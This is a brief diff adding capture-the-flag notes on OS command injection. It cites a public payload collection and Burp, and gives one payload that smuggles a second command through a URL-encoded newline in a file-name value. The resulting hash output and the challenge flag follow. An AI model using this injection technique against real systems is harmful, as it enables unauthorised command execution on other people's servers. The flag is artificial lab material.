@@ -1,0 +1,6 @@
+payloadsallthethings os command injection payloads + burp:
+Bypass with a line return
+flag.txt%0Acat%20flag.txt
+Results:
+015d77faddb1261d42af3e48baa24eb817326ef755b179bef511009bf0ced2f9  flag.txt
+flag{62b8b3cb5b8c6803bf3dc585b1b5141d}
